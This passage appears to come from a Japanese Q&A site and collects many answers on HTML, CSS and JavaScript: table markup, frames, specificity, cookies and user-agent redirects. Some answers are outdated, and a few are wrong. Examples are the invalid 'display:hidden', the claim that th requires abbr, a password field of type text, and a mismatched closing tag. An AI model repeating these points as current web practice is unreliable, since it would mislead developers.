だろうが、なんだろうが自由自在にデザインできまます。まず、きちんとHTMLを書きましょう。HTML自体はとっても楽だと思います。
HTML5で特別なわけではなく。 単にスタイルシートでbackgroundかbackground-imageで指定すればよいだけです。 　HTML5の前に、HTML4.01（strict!!）を身につけましょう。HTML5はまだ未勧告で、いまだに変更が続いています。HTML4.01が身についていない段階でHTML5は次期尚早です。 　HTML5では、HTML4.01で非推奨＝HTML4.01strictで使えなくなっていたプレゼンテーション用の要素や属性が一切ありません。(要はHTML4.01strictの改訂版) 　HTML5は、HTML,CSS,WAI,DOM,APIも含んだ膨大な仕様です。HTML4.01stictが完全に理解できている人には苦もない事ですが・・。
optionでターゲットウィンドウにリンクする方法は、No.1さんの方法で動作します。 ただ、「フレーム」も「javascriptでのナビゲーション」も使うべきではありません。 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』--strictにフレームはない 『JavaScript、・・・【中略】・・・などの特殊な機能が使用されているためにサイトの一部がテキスト ブラウザで表示されない場合、検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。( https://support.google.com/webmasters/answer/357 … )』 "フレーム 問題 HTML - Google 検索( https://www.google.co.jp/search?num=30&safe=off& … )" 　現在はフレームで新しいペーづを作成することは、全くなくなったといってよいでしょう。新規サイトで見なくなって10年以上たちます。 　できれば、きちんとリンクをリストで書いてスタイルシートでプルダウンにしましょう。
XHTMLのバージョンが分かりませんが、XHTML1.0は、HTML4.01をそのままXMLにしたものですから、HTML4.01の仕様書--ただしstrict!!--を確認するのが良いです。 <table>要素には、summary属性が必須です。 <table>要素には、次の要素が入ることが出来ます。 　<caption>　任意 * 必ず<table>の次ぎ 　<col>または<colgroup>の何れか 任意 * 　<thead>　　任意 * 　<tfoot>　　任意 * 　<tbody>　　ひとつ以上必須 + (CAPTION?, (COL*|COLGROUP*), THEAD?, TFOOT?, TBODY+)>( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) です。 <tbody>要素には tr要素のみひとつ以上 + <tr>要素は、(TH|TD)+ ですから、thかtdをひとつ以上 th要素にはabbr属性が必須!! よって厳密に書くと <table summary="なんたらの表"> 　<caption>コーヒーの摂取量</caption> 　<thead> 　　<tr> 　　　<th abbr="性別">性別</th> 　　　<th abbr="朝">朝</th> 　　　<th abbr="昼">昼</th> 　　</tr> 　</thead> 　<tbody> 　　<tr> 　　　<th abbr="男">男</th> 　　　<td>1杯</td> 　　　<td>２杯</td> 　　</tr> ・・・ とか、 (1)、XHTMLのtableに、captionって使っていいの？ 　　つかえます。 (2)、<th>って、一番上の<tr>～</tr>間以外に使ったら駄目？もしくは、使ってもいいが好ましくない？ 　　一番上にするなら、<thead></thead>にしましょう。長大な表を表示したり印刷するとよくわかる。 　　<th>だろうが<td>だろうが良いですが、基本的にはtheadでしょう。 (3)以下、サンプルソースみたいな使い方はしてもいいのでしょうか・・・？ <table summary="色の心理効果"> 　<caption>色の心理効果について</caption> 　<tbody><!-- 表本文の一つ目 --> 　　<tr> 　　　<th abbr="赤">赤の心理効果</th> 　　　<th abbr="青">青の心理効果</th> 　　　<th abbr="黄">黄色の心理効果</th> 　　</tr> 　　<tr> 　　　<td>気持ちを前向きにさせる</td> 　　　<td>集中力を高める</td> 　　　<td>集中力を発揮させる</td> 　　</tr> 　</tbody> 　<tbody><!-- 表本文の二つ目 --> 　　<tr> 　　　<th abbr="緑">緑の心理効果</th> 　　　<th abbr="桃">桃の心理効果</th> 　　　<th abbr="紫">紫の心理効果</th> 　　</tr> 　　<tr> 　　　<td>リラックスさせる</th> 　　　<td>幸せ・優しい気持ち</td> 　　　<td>高貴・神秘的</td> 　　</tr> 　</tbody> </table> と書けばよいだけですけど・・・文書構造だけを落ちがないようにマークアップする。ソンだけです。 　そうすれば table tbody th:first-child th, table tbody th:first-child td{ border-top:double 3px red;} とかスタイルシートで指定できる。 　わざわざややこしい、XHTMLでなくて、よりトレンドなHTMLにすれば楽です。 <table summary="色の心理効果"> 　<caption>色の心理効果について</caption> 　<tbody><!-- 表本文の一つ目 --> 　　<tr> 　　　<th abbr="赤">赤の心理効果 　　　<th abbr="青">青の心理効果 　　　<th abbr="黄">黄色の心理効果 　　<tr> 　　　<td>気持ちを前向きにさせる 　　　<td>集中力を高める 　　　<td>集中力を発揮させる 　<tbody><!-- 表本文の二つ目 --> 　　<tr> 　　　<th abbr="緑">緑の心理効果 　　　<th abbr="桃">桃の心理効果 　　　<th abbr="紫">紫の心理効果 　　<tr> 　　　<td>リラックスさせる 　　　<td>幸せ・優しい気持ち 　　　<td>高貴・神秘的 </table> と書ける。いずれHTML5になるのでね。 ※HTML5では、tableのsummary属性はなくります。 ※TH要素のabbrは必須でなくなります。
実行ディレクトリが異なっているのが原因かもしれませんね。 以下のようにしてみてはどうでしょう LATEST.batを作成、メモ帳などで開き、以下の内容を記述 ::ここから CD CH010912 LATEST.exe ::ここまで HTMLではbatファイルを呼ぶ <html> <head> <body> <a href="CH010912/LATEST.bat">起動のテスト </body> </head> </html>
htmlソースじゃない(頭文字だから、HTMLと言う問題ではない) メールソースを解析ですね。 他のネットワーク通信と同様に、送受信されるデータは、headerと呼ばれる部分と、改行コードをひとつ挟んでbody部分になっています。 HTTPプロトコル(手続き)でも、mailプロトコルでも、ftpでも同じです。 mailはとても古くからある通信プロトコルですから、メールを転送するサーバーのシステムは古いものが介在するという前提です。 　ascii文字とか送れないために、エンコードされています。 ここに、Perlを使っての方法が、とても詳しく説明されています。 　⇒Base64エンコード・デコードする( http://www.din.or.jp/~ohzaki/perl.htm#JP_Base64 ) 　通常はMUA(Mail User Agent)がよきに取り計らってくれます。Thunderbirdでしたら、ヘッダーを表示でエンコードされた物が表示されます。
よく見てみると、例の店舗はそのままyoutubeのiframeを埋め込んでいるのではなく、 youtubeのiframeを埋め込んだhtmlをgoldにアップし、それをさらに商品ページにiframeで埋め込んでいますね。 http://www.rakuten.ne.jp/gold/k-online/garix2sur … この方法なら出来るんじゃないでしょうか。 再生メニューのついたswfの作成は、私は普段Flashを使ってやってます。 Flashでの作成は、まず動画をflvに変換してそれをFlashで読み込みます。 読み込む際に「再生コンポーネントと共にロード」を選択し、スキンを選びます。 その状態で書き出せば、swfが排出されます。 上記の方法ではflvを読み込むswfが出来るだけですので、サーバーにflvもアップする必要があります。 古いバージョンで出来るかどうかは知りません。 フリーソフトでやる方法については調べた事が無いのでちょっとわかりませんが、 こういうのが参考になるのではないでしょうか。 http://oshiete.goo.ne.jp/qa/4103111.htm まぁyoutubeの方が簡単だと思いますが。
>その<article>に<hn>タグがないことが疑問に思わせた発端なのですが 一応、こちらの質問に対しての回答を。 見出し（タイトル、表題）がなければ<hn>がなくてもかまいません。 何らかの理由で必要だというのなら、皮肉たっぷりにタイトル：「無題」とでも付けておけば良いと思います。
詳細度、カスケーディングがおかしいようですが・・・検討のうえでしょうか？ !importantだと、その要素への指定は他に詳細度が高いものがあっても上書きできませんけど。 .frame div　詳細度　0,0,1,1 div.frame　　詳細度 0,0,1,1 div.frame iframe[style 詳細度 0,0,2,2 <iframe ・・・・style="　詳細度　1,0,0,0 どのように表示したいかがわからないのでなんとも・・
＞古い書き方だから改行による崩れもおきる、ということなのでしょうか？？ 　正確に言うと「IEの互換モードでは」と言う事です。IEは以前、他のブラウザを追い落とすために、独自仕様でユーザーの囲い込みをしてきました。そのために、IEでないと表示できないページがたくさん増えました。HTML4.01(1999)以降「Webページはより複雑化し、限られた環境にしか適応しなくなり、相互運用性問題に悩まされることとなり、障害を持つ人々にアクセス障壁が設けられてしまう。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」の反省から、ウェブ標準が浸透して、やっと最近になってIEもウェブ標準に従うことになりました。 　ところが、過去のIEの仕様に合わせたページもたくさん残っていますから、それらを表示するために互換モードがあります。そのためです。IEだけの問題で、他のブラウザではそのようなことは置きません。 　HTMLでは、『本仕様は、・・・【中略】・・・スペース文字類については、レンダリングその他の挙動を示すことはない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　と明記されています。よって<img src="" width="" height="" alt="">(改行)(水平タブ)</td>の(改行)(水平タブ)は無視されなければならないのです。!! 　いずれにしても検証には他のウェブ標準なfirefoxなどの他のブラウザを使用するのが良いです。firefoxとfirebugで、何処がどう影響しているかはすぐ分かるはず。 ★tableを使ってはいけない・・ 「単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 「ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　これは、最も重要な基本です。
apacheでしたら <FilesMatch "^\.ht"> 　　Order allow,deny 　　Deny from all 　　Satisfy All </FilesMatch> とか指定してあって閲覧できないはずです。 　サイト内を見て推測で言っているかでしょう。 　そもそも、他人のウェブサイトを見て、あなたのレベルを推測して、指摘するのはSEO業者としてあるまじき行為ですね。
ユーザースタイルシートで、その要素をdisplay:hidden!important;とすれば良いです。visibility:hidden!important;で大きさは残しても良いでしょう。 　御存知だと思いますが、カスケーディングの仕様で、ユーザーの最重要宣言は著者のそれよりも優先されますが、最重要宣言がないと、著者のスタイル、著者の最重要宣言が優先されます。 　⇒6.4.1 カスケード処理の順序( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )
「押した感じを表現」するには「押した感じ」の画像を用意しないといけません。コードでどうこうじゃない。 ちなみに、画像を用意したらonmousedownで換えればいいと思います。
User-agent:Baiduspider User-agent:Baiduspider-image User-agent:Baiduspider-video User-agent:Baiduspider-news User-agent:Baiduspider-favo User-agent:Baiduspider-cpro User-agent:Baiduspider-ads クローラーの種類です。 参考してください。(-_-)b 参考URL：http://www.baidu.com/search/spider_english.html
　HTML5の記法ですよね。もし腐った牛乳と揶揄されるIE6をターゲットにするなら、HTML5は使用すべきではありません。HTML4.01やCSS2.1も不完全です。HTML3.2あたりで押さえておいたほうが無難です。(^^) 　⇒マイクロソフト、IE6 撲滅に向けた一大キャンペーン始める | スラッシュドット・ジャパン( http://slashdot.jp/story/11/03/07/2037203/%E3%83 … ) 　IE6では、<meta charset="UTF-8">は理解してくれないでしょう。 　HTML5は、まだ時期尚早ですよ。まずHTML4.01strict　transotinalやframesetではない。 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　HTML5は、HTML4.01strictの改訂版です。HTML4.01strictさえ未熟な段階で、HTML5には手を出さないほうが良いです。例えばDIVは原則として使わなくなりますし・・
出来ません。 autocompleteの目的は、常にユーザーが値を変更したように装うための物ですす。offにすると入力値はブラウザに記憶されませんから、例えば重要なパスワードなどは、 <input type="text" name="pwd" autocomplete="off" size="10">とか・・ 　選択済みにする場合は、option要素のselectedを使用します。この場合、意味的にoffとは整合しませんから、autocompleteを書かずdefaultでよいのでは？？ <input type="text" list="hoge"> <datalist id="hoge"> 　<option value="1">A 　<option value="2" selected>B 　<option value="3">C </datalist>
ウェブサイトは仰るとおりHTML、CSS、javascriptの3点でデザイン、動きを表現しています。 表現１ これは写真の切り替えに、javascriptとcssを利用しています。 「jquery　スライドショー」で検索してみてください。 javascriptを使用した様々なスライドショーがたくさん見つかります。 表現２ これはHTML＋CSSで作られています。 ヘッダーをブラウザの上から17p下の位置に常に固定し、最前面に表示するように CSSで指定しています。 表現３ これは表現１と同じく、javascriptとcssを利用しています。 ソースを確認するとfancyboxというスクリプトを使っているみたいですね。 これと似たもので有名なものに、LightBox2というものがあります。 他にもCSSだけで作るアコーディオンメニューや、 CSSとjavascriptで作るアコーディオンメニューなど面白いものもありますし、 アイデア次第でいろいろなものを作れるので、気になったサイトのソースを覗いて 調べてみると良いと思います。 IEやChoromeだったら、F12を押せば開発者ツールが表示されて、 気になったところの要素を簡単に調べることができますよ。
＞CGIとかPHPとかPerlとか何を使って そもそも、自分で組み込めるの？特にPHPは作ったhtmlのフォームに対してタグに命令を書くものであって パーツ持ってきて埋め込む物じゃない。 そこのところもわかってないってことは、相当の初心者だから、CGIも持ってこられないんじゃないかな。 グーグルで　レンタルフォーム　と検索。 そうするとふぉーむまんとかふぉーむらんとかフォームズとか無料でフォームを作れるサービスが出てくるので そこで作って、貴方のWebページにリンク貼るかifremeで持って来るだけで完了するもの使ったほうが 楽よ。コレなら、なーーーーーんの知識も無く出来合いの物を貼り付けるだけ。
・マウスオーバーでゆっくり画像が暗くなり、テキストが表示されるは... .fade { -webkit-transition: 0.3s ease-in-out; -moz-transition: 0.3s ease-in-out; -o-transition: 0.3s ease-in-out; transition: 0.3s ease-in-out; } でhtmlにclass="fade"を設定したら行けますよ(^^) テキストはぎゃくの設定をcssですると背景画像と反対の動きになるので、そう設定すればよいです。 参考 http://e1116.blog.fc2.com/blog-entry-24.html ////////////////////////////////////////////////////////////////////////// ・画像を押すとリンク先へ移動する <a href="URL">～</a> です。 参考 http://www.tohoho-web.com/html/a.htm ////////////////////////////////////////////////////////////////////////// ・マウスを画像から離すと元に戻る 一番上の記載ある設定を行うと自然とホーバー時から通常時に戻るので戻ります。 ////////////////////////////////////////////////////////////////////////// このサイトの逆引きで aタグとか基本なら何とかなりますよ(^^) http://www.tohoho-web.com/html/index9.htm あとはググるしかないですけど、ググるコツみたいなのもしていくと何となく分かって来ますよ(^^) 頑張ってください。
既出なら申し訳ないですが、私はこれでいけました、ちなみにcssの振り分け（レスポンシブ）ではなく、htmlがpc用・スマホ用・タブレット用などの分岐jsです headに記述・jqは関係ないです。 ↓ <script type="text/javascript"> if ((navigator.userAgent.indexOf('iPhone') > 0 || navigator.userAgent.indexOf('iPad') > 0) || navigator.userAgent.indexOf('iPod') > 0 || navigator.userAgent.indexOf('Android') > 0) { location.href = 'スマホ用のURL'; } </script> 色々な方法があると思いますので参考までに(^^) .htaccessは触っていません。
ちなみに…… > 外部ファイル化する目的は、同じサイトの他のページに > 入力された文字列 (mf) を移動させるためです。 これはJavaScriptを外部ファイルにすることでは実現できません。 (外部ファイルにすることで複数のページで同じスクリプトを使い回しできるだけであって、 変数を共有できるわけではありません) フレーム間で渡すか、CookieやURLのクエリ文字列に格納して渡すかしてください。 (フレーム間で渡す場合) top.フレーム名.document.getElementById("myDIV02").innerHTML = mf;
> フレームを使う 悪いことは言いません。もうフレームを使うのはもう止めましょう (昔から言われてる) http://www.usability.gr.jp/alertbox/9612.html (最近ついに廃止に) http://html5.jp/trans/w3c_differences.html#absen … > スクリプトをHTMLページから独立させて、 これは可能ですが > 複数のページで同様の文字列の受け渡しを はスクリプト単体ではセキュリティー観点から「絶対に」無理です。あきらめましょう 抜け穴としては、親子関係ページとか iframe とかがありますが、汎用的ではありませんので というわけで cookie を利用するスクリプトをどうぞ // ataitukaimawasi.js function setHensu(name, value) { document.cookie = encodeURIComponent(name) + "=" + encodeURIComponent(value); } function getHensu(name) { var key = encodeURIComponent(name); var m = document.cookie.split(/\s*;\s*/).filter(function(t){ return t.indexOf(key + '=') == 0 }); if (m.length == 0) return null; return decodeURIComponent(m[0].replace(/^.+=(.+)$/, '$1')); } // pageA.html <script src="ataitukaimawasi.js"></script> <form name="form3"> <input name="in3" value="ほげ"> <input type="button" onClick="setHensu('hoge',this.form.in3.value)" value="write"> </form> // pageB.html <script src="ataitukaimawasi.js"></script> <form name="form4"> <input type="button" onClick="this.form.out3.value=getHensu('hoge')" value="read"> <output name="out3" style="background:pink"></output> </form>
＞埋め込み方 ＞概要 そのサイトのその動画の部分のソースを見れば「全部」書いてある。 あとは「SWF 埋め込み」とかでググれ。 これくらいも分からん奴がサイトに動画置こうなんておこがましいけどな。
No.1 ですが、例示が不完全でしたね。 outputId = 入力窓 <div> の属性 id の値 formName = 入力欄を含む <form> の属性 name の値 itemName = 入力欄 <textarea> の属性 name の値 // 例題 <form name="form1"> <textare name="text1"></textarea> <br> <input type="button" onClick="※" value="verify"> </form> <div id="output"></div> <div id="output"> → 'output' <form name="form1"> → 'form1' <textare name="text1"> → 'text1' 埋め込みスクリプト形式にするため、二重引用符を一重に変換しています ※の中身 = textout('output','form1','text1') 複数の入力欄が必要なら、form 内に textarea を追加し、それごとにボタンを増やして itemName だけを text2, text3 と書き換えるのが簡単でしょうか
こっちのほうが簡単、良くみりゃ<ul><li>は意味ない。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.nav{ width:210px;height:173px;margin:10px auto; background-image:url(./images/camera.jpg); position:relative; } div.nav dl, div.nav dl dt, div.nav dl dd{ ＿list-style:none;display:block;margin:0;padding:0; } div.nav h3{ ＿margin:0; ＿position:absolute; ＿height:20px;width:100%; ＿background-color:white; ＿bottom:0; } div.nav dl dt a{ ＿display:block; ＿position:absolute; ＿text-indent:-200px;overflow:hidden; } div.nav dl dd{ ＿display:none;position:absolute;bottom:0;height:20px; ＿background-color:white; } div.nav dl dt:hover a{ background-image:url(./images/camera.jpg); overflow:visible; } div.nav dl dt:hover+dd{display:block;} div.nav dt a[href="map1.html"]{ left:86px;top:94px; background-position:-87px -249px; width:41px;height:41px; } div.nav dt a[href="map2.html"]{ left:60px;top:34px; background-position:-62px -190px; width:20px;height:27px; } div.nav dt a[href="map3.html"]{ top:19px;left:90px; background-position:-92px -174px ; width:29px;height:27px; } div.nav dt a[href="map1.html"]:hover{ width:200px; text-indent:41px; } div.nav dt a[href="map2.html"]:hover{ left:0px;top:34px; background-position:0 -190px; width:85px; text-indent:-50px; } div.nav dt a[href="map3.html"]:hover{ width:200px; text-indent:29px; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<div class="nav"> ＿＿＿<h3>カメラの説明</h3> ＿＿＿<dl> ＿＿＿＿<dt><a href="map1.html" alt="リンク1">レンズ</a></dt> ＿＿＿＿<dd>被写体からの光を集めてフィルムに像を作る。</dd> ＿＿＿＿<dt><a href="map2.html" alt="リンク2">シャッターボタン</a></dt> ＿＿＿＿<dd>シャッターを開けて撮影する。</dd> ＿＿＿＿<dt><a href="map3.html" alt="リンク3">ファインダー</a></dt> ＿＿＿＿<dd>撮影する目標を決める。</dd> ＿＿＿</dl> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
＞アンケート項目を複数のページで作成したいのですが、私の知識では、何十もの質問欄の文字入力の結果をとても長い一つのページに詰め込む以外に方法を考え付きません。 ＞ユーザー側がどのようなコードを書けば良いかという質問でした。 　この二つは矛盾しています。複数のページで作成するためには、必ずCGIを使用することになります。様々な方法がありますが [1ページ目] フォームからCGIに送信 [2ページ目] 受け取ったデータを隠しデータにして新しいフォームを作成 [3ページ目] 受け取ったデータを隠しデータにして新しいフォームを作成 ・・・ [最終]受け取ったデータを隠しデータにして、確認フォームを作成しそれを既存のCGIに送信 と言う手順になります。 [例]以前回答した 　　⇒CGIでラジオボタンの選択結果を保持する (1/2) - CGI - 教えて！goo( http://oshiete.goo.ne.jp/qa/8237906.html ) 　一枚のHTMLを複数のページのように見せる方法はあります。
No.1です。 ＞HTML5を使うときはie6、ie7でmargin: auto;で中央寄せできますか？ 　えっ!!。HTML5を使う時点で、IE6,IE7,(IE8)は切り捨ててますから・・・考慮しません。 　スマホやIE9以降、および他のモダンブラウザ、firefox,Opera,Chromeをターゲットに絞ります。 　HTML5で書いてIE6,7,8はターゲットブラウザでないので、質問自体が矛盾しています。(javascriptを使って対処は出来ますが、javascriptを無効にしていたら崩れます。) {HTML5のサンプル]・・かならず、試すこと ★タブは＿に置換してあるので戻す。 <!doctype html> <html> <head> ＿<meta charset="utf-8"> ＿<title>サンプル</title> ＿<meta name="description" content=""> ＿<meta name="author" content="IRUKA"> <style media="screen"> <!-- html,body{margin:0;padding:0;background-color:gray;} p{text-indent:1em;} header,section,footer{ width:80%;min-width:630px;max-width:900px; margin:0 auto; padding:5px 10px; } h1,h2,h3,p{ margin:0;line-height:1.8em; } section{ min-height:200px; position:relative; } section section{ width:auto;min-width:0; margin:0 auto; padding:0; min-height:0; } section nav{ position:absolute; right:0;top:0; width:20%;height:100%; } section section,section h2{ margin:0 22% 0 0; } /* 分かりやすいよう色づけ */ header{background-color:aqua;} section{background-color:white;} section h2,section p,section h3{background-color:rgb(255,255,180);} section nav{background-color:silver;} footer{background-color:lime;} --> </style> </head> <body> ＿<header> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</header> ＿<section> ＿＿<h2>見出し</h2> ＿＿<section> ＿＿＿<h3>質問</h3> ＿＿＿<p> ＿＿＿＿ie6でmargin:0 autoで中央寄せできないバグがありましたが、ie7では中央寄せできるようになったのでしょうか？ ＿＿＿</p> ＿＿＿<p> ＿＿＿よろしくお願いします ＿＿</section> ＿＿<section> ＿＿＿<h3>回答</h3> ＿＿＿<p> ＿＿＿＿IE8以前は、HTML5の新しい要素を理解できませんから、それらをターゲットにするときはHTML5は使用しません。 ＿＿＿</p> ＿＿＿<p> ＿＿＿＿また、DIVは原則として使えなくなりますし。 ＿＿＿</p> ＿＿</section> ＿＿<nav> ＿＿＿<h3>目次</h3> ＿＿＿<ol> ＿＿＿＿<li>第一章</li> ＿＿＿＿<li>第二章</li> ＿＿＿＿<li>第三章</li> ＿＿＿＿<li>第四章</li> ＿＿＿</ol> ＿＿</nav> ＿</section> ＿<footer> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</footer> </body> </html>
そういう場合には、ユーザーエージェントを判別して振り分けを行います。 利用者の環境によって、別ページ（別ディレクトリ）へ遷移するという事です。 やり方としては主にphpで行う方法、.htaccessで行う方法があります。 phpでやる場合は当然ファイル拡張子を.phpにする必要があります。 javascriptでも出来ます。 ユーザーがjavascriptを切っていると使えませんが、スマホやタブレットでjavascriptを切る事はほぼないと思うので、これも有効です。 やり方は下記を参考に。 http://html5-css3.jp/smartphone/pc-iphone-androi … 1の方が言うような同一ファイルで横幅によってレイアウトを変更するようなやり方はレスポンシブデザインと言って流行のやり方ではありますが、デメリットも多く全てのサイトに向いているわけではありません。 レスポンシブのメリットとしては、同一htmlなので更新が1か所で済むのが一番で、あとはよく設計された場合に作業量が少なくて済む所です。 SEOに強いという噂はありますが、Googleの方が「そんなふうにはサイトを差別化しない」と否定しています。 デメリットとしては、スマホサイトを作った場合よりも読み込みが遅い（PC用の画像等を全部読み込むため）、 開発にコストがかかる、などです。 またレスポンシブに対応するにはある程度スキルが必要で、慣れていない方には敷居が高いです。 今からサイト自体を設計するのなら、考慮に入れてもいいですが、 今すでにサイトがあり、1ページだけ振り分けたいという事でしたら レスポンシブ対応は全くお勧めできません。 その場合は普通に別ファイルを作成して振り分けたほうが、レスポンシブ20分の1くらいの作業量で出来ると思います。
>質問１ border-left-width: 0 などとして片方を消せば、１本になります。 太くなるのであれば、それは重なっていません。となりに並んでいます。 ちゃんと重ねれば１本分の太さで表示されます。
ブラウザからの起動が必須でないなら、むしろvbsを使用する前提なのですから vbsで組んでしまえばよいのでは？ ただしメールで送付させるロジックを書くのは意外に面倒ですので そもそもが命題自体が達成できないような気はしますが・・・
どちらも見た目部分はhtml+cssで基本を作って、JavaScriptで動きをつけてます。 http://tancobuchin.jp/ のトップページはhtml+cssのみで実現できます。 http://tancobuchin.jp/schedule/tv.html などで動く部分はJQueryというJavaScript libraryを使用してます。 どちらもwordpressとJQueryで似たようなもの作れますね。
> 質問1> 質問1 html5で新しく追加されたタグ（sectionやarticle等）はIE7以下では認識しません。 古いブラウザに、新しいタグをタグとして認識させるためのjavascriptがあるので、検索してそれを使用しましょう。 javascriptを切れば当然崩れます。 > 質問2 チェックサイト等でエラーは出ませんが、html5でやる意味はあまりないですね。 まぁその書き方だと上記のjavascriptを使用せずに表示でき、「html5で書いてます！」と一応言えますが、 「html5で書いてね」という依頼でこれをやるのはどうかと思いますね。 > 質問3 floatが主流だと思います。 「floatは本来の使い方と異なる」とpositionでレイアウトを行う方も居ますし私も必要に応じてpositionでレイアウトしますが、 positionはきちんと把握していないと扱いが難しい上に、他人が書いたものをぱっと見て理解するのにfloatに比べ時間がかかりますので、複数人で管理する場合などには更新性が低くなります。 なので、現場ではfloatでレイアウトする事が多いです。
動画ファイルをおいたフォルダがログインページのフォルダの直下にないか 動画ファイルをおいたフォルダの認証情報が別設定になっていませんか？
プログラムではなく、HTMLのソースコードの部分ですね。 これは、XML宣言がないのでXMLではありませんが、XML構文で書かれているHTML5のコードですね。 　XHML(XML)とHTMLの違いの説明は長くなるのでここでは説明しません（ご自身で調べてください)が、HTML/XHTML/XMLのようなSGMLに起源や由来を持つマークアップ言語は、文書を構成するそれぞれの要素をタグを使ってマークアップしていきますが、そのタグは、 <開始タグ>内容</終了タグ>という形になっていますが、htmlの場合は、 ・内容を持たない要素 　<BR>、<IMG>　　終了タグを持ち得ない要素 ・終了タグを省略できる要素 　<P>、<LI> がありましたね。 　XMLや、XML構文で書かれるXHTMLは、これらは ・内容を持たない要素は/>とする 　<br />、<img ***** /> ・終了タグは省略できない 　です。 　XML構文はプログラムから出力する。プラグラムでデータを処理させるのにとても楽です。 HTMLでは、 　<p>ここから段落 　<p>ここから次の段落 と書くことも許されていました。なぜならP要素の中にはブロック要素をもてないため、次にブロック要素が出てくると閉じられると判断できるからです。したがって人が書くのはとても楽ですが、プログラム側には大きな負担になります。そこでXML/XHTMLは文法が厳格で、ひとつの閉じ忘れも許されません。 　以前のHTML4.01では、内容の無い要素について/>で閉じることは出来ませんでしたが、HTML5では、XHTMLとの互換性のため、そのような閉じ方も許されています。
そんなもの、こだわる必要がない!!!が正答でしょう。(^^) そもそもHTMLは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　なのですから、いくらscreen相手に凝ったデザインにしたって、モノクロディスプレイや、スクリーンリーダー、展示端末、検索エンジンには無意味なのですからね。 　Lynxで表示を確認するほうが重要!! 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Lynx などのテキスト ブラウザを使用して、サイトを確認します（ほとんどの検索エンジンのスパイダーには Lynx で見えるようにサイトが映ります）。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン（品質に関するガイドライン） - ウェブマスター ツール ヘルプ( https://support.google.com/webmasters/answer/357 … )］より 　IE7,8だけじゃなく、他のユーザーエージェントにも配慮するほうが本来の方法、IE8以前のブラウザで見ても差し支えないように・・ 　まあ、自己満足ですが、javascriptはあります。 　⇒IE6～8でも一部のCSS3が使える！「CSS3 PIE」の使い方 [ホームページ作成] All About( http://allabout.co.jp/gm/gc/377416/ ) 　⇒古いIEでもCSS3のセレクタが利用できる「Selectivizr」 | Web | position: absolute;( http://maepon.skpn.com/web/entry-40.html ) 　ですが、決して深入りしないように。大事なことはもっとたくさんあります。
スタイルシート部分です。 　CSS2の本来の書き方に則しています。 CSS2では、基点となるセレクタに続いて「つなげるセレクタ」でつなげていきます。そのため*(全称セレクタ)が追加されています。 　#PRとは、*#PRと感謝腐れます。idがPRの値のすべての要素と言う意味です。 しかし、基点となるセレクタを書く癖をつけたほうが後々楽です。他のページで別の箇所に同じPRidが使われていても適用されないので混乱しなくてすみます。 ★子孫セレクタ、隣接セレクタ、属性セレクタなどを活用して、HTMLの文書構造にしたがってセレクタを書く技術を身につけましょう。ものすごく分かりやすくなります。極端に言うとHTMLを見なくてもデザインできるようになります。 [例] div.section div.section p.Logo{ 　はsection(本文)ブロックの内=子孫(半角スペース)のsectionブロック内のclass属性にLogoを持つp要素と読みます。 div.section div.section+div.section{margin-top:50px;} 　は、そのうちのdiv.sectionと隣接した(+)sectionについてのmargin-topの指定です。 div.section div.section{}で指定したmargin:0を上書きでます。 　詳細度が大きいからです。 　￣￣￣￣￣￣￣￣￣￣￣￣ div.section div.section+div.section　　詳細度 [0 0 3 3]　・・・33 div.section div.section　　詳細度[0 0 2 2]　・・・22 div.section　　詳細度[0 0 1 1]　・・・11 　⇒5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　⇒6 プロパティ値とカスケーディング、継承の割り当て( 